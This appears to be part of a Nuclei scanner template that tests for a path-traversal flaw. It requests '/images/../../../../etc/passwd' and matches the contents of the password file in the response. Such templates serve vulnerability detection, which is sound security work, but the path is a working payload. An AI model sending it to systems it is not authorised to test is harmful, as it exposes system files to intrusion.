http:
    - matchers:
        - part: body
          regex:
            - 'root:.*:0:0:'
          type: regex
        - part: header
          type: word
          words:
            - application/octet-stream
        - status:
            - 200
          type: status
      matchers-condition: and
      method: GET
      path:
        - '{{BaseURL}}/images/../../../../../../../../etc/passwd'
